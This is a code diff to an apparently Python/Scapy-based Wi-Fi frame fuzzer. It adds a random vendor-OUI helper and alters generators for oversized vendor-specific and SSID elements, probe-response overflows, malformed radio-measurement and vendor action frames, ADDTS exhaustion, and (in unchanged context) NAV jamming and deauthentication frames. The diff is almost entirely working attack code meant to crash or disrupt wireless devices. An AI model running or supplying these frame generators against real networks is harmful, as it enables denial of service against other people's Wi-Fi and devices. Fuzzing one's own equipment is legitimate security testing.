@@ -11,6 +11,13 @@ def get_base():
 def get_random_client_mac():
     return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
 
+def get_random_oui():
+    """
+    Get random Organizationally Unique Identifier from a choice of
+    Microsoft, Ruckus Wireless, Ralink / MediaTek, Atheros, Qualcomm, Realtek, Wi-Fi Alliance
+    """
+    return random.choice([b'\x00\x50\xf2', b'\x00\x13\x92', b'\x00\x0c\x43', b'\x00\x03\x7f', b'\x00\xa0\xc6', b'\x00\xe0\x4c',b'\x50\x6f\x9a'])
+
 # Stateless Fuzz frames
 
 def _get_ssid_too_long():
@@ -27,9 +34,10 @@ def _get_random_id():
     return Dot11Elt(ID=rid, len=random.randint(150, 255), info=RandString(10))
 
 def _get_vendor_specific():
-    random_len = random.randint(1, 255)
+    random_len = random.randint(3, 255)
     base = get_base()
-    return Dot11Elt(ID=221, len=random_len, info=random.randbytes(1000)) / base
+    payload = get_random_oui() + random.randbytes(997)
+    return Dot11Elt(ID=221, len=random_len, info=payload) / base
 
 def _get_nav_jamming():
     duration = random.randint(10000, 65535)
@@ -41,14 +49,15 @@ def _get_deauth():
 
 def _get_probe_resp_overflow():
     base = Dot11ProbeResp(timestamp=random.randint(0, 99999999), beacon_interval=0x100, cap=0x2104)
-    ssid_tag = Dot11Elt(ID=0, len=23, info="Probe response overflow")
-    rates_tag = Dot11Elt(ID=0, info=b"\x82\x84\x8b\x96")
+    ssid_tag = Dot11Elt(ID=0, len=random.randint(0, 30), info=random.randbytes(500))
+    rates_tag = Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
     return base / ssid_tag /rates_tag
 
 def _get_probe_resp_vendor():
     base = Dot11ProbeResp(timestamp=random.randint(0, 99999999), beacon_interval=0x100, cap=0x2104)
     ssid_tag = Dot11Elt(ID=0, len=21, info="Probe response vendor")
-    vendor_tag = Dot11Elt(ID=221, len=255, info=random.randbytes(255))
+    payload = get_random_oui() + random.randbytes(252)
+    vendor_tag = Dot11Elt(ID=221, len=255, info=payload)
     return base / ssid_tag / vendor_tag
 
 def _get_probe_resp_csa():
@@ -113,8 +122,8 @@ def _get_txop_assoc_overflow(ssid: str):
     base = Dot11AssoReq(cap=0x1101, listen_interval=0x0003)
     essid = Dot11Elt(ID=0, info=ssid)
     rates = Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
-    # Organizationally Unique Identifier + type 2 - wmm extension
-    oui_wmm = b"\x00\x50\xf2\x02"
+
+    oui_wmm = get_random_oui()
     wmm_payload = random.randbytes(random.randint(50, 255))
     fuzzed_wmm = Dot11Elt(ID=221, len=len(oui_wmm + wmm_payload), info=oui_wmm + wmm_payload)
     
@@ -185,7 +194,7 @@ def _get_radio_measurement_oob():
     fake_len = random.randint(100, 255)
     malformed_ie = Dot11Elt(ID=39, len=fake_len, info=random.randbytes(10))
 
-    return Raw(load=category + action + dialog_token) / malformed_ie
+    return Raw(load=category + action + dialog_token + malformed_ie)
 
 def _get_wnm_bss_transition():
     """Generates a WNM BSS Transition Management Response with fuzzed status code and neighbor AP mac addresses."""
@@ -202,8 +211,8 @@ def _get_wnm_bss_transition():
 def _get_vendor_action_crash():
     """Generates malformed Action Frames (Category 127 is Vendor Specific)."""
     category = b'\x7f'  # Vendor Specific
-    # Organizationally Unique Identifier - Microsoft, Ruckus Wireless, MediaTek
-    oui = random.choice([b'\x00\x50\xf2', b'\x00\x13\x92', b'\x00\x0c\x43'])
+
+    oui = get_random_oui()
     vendor_action = random.randbytes(1)
     vendor_payload = random.randbytes(random.randint(10, 500))
 
@@ -216,7 +225,7 @@ def _get_txop_addts_exhaustion():
     
     dialog_token = random.randbytes(1)
     # Traffic Specification parameters
-    tspec_id = b'\x7a'
+    tspec_id = b'\x0d'
     tspec_len = random.randint(100, 255)
     tspec_fuzzed_params = random.randbytes(tspec_len)
     tspec_element = tspec_id + bytes([tspec_len]) + tspec_fuzzed_params
